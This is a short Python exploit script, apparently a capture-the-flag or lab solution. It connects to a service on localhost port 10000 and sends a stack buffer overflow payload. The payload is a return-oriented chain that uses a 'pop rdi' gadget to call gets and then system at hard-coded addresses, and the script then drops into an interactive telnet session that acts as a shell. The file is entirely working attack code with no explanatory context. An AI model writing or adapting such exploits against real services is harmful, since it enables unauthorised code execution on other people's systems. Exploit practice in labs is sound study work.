import socket
import struct
import telnetlib

def sock(host,port):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host,port))
    return s

def p64(data):
    return struct.pack("<Q",data)

def writebuf(buf):
    fd = open('buf','wb')
    fd.write(buf)
    fd.close()

def interactive(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def main():
    s = sock("localhost",10000)
    print(s.recv(1024))

    # Create payload
    # pop rdi = 0x400763
    buf = 'A' * 0x80 # fill buffer
    buf += 'A' * 8   # ebp
    buf += p64(0x400763) # return address (pop rdi)
    buf += p64(0x601058) # gets arg
    buf += p64(0x400570) # gets got
    buf += p64(0x400763) # return address (pop rdi)
    buf += p64(0x601058) # system arg
    buf += p64(0x400540) # system got
    buf += "\n"

    writebuf(buf)

    s.send(buf)
    print(s.recv(1024))

    interactive(s)

if __name__ == '__main__':
    main()
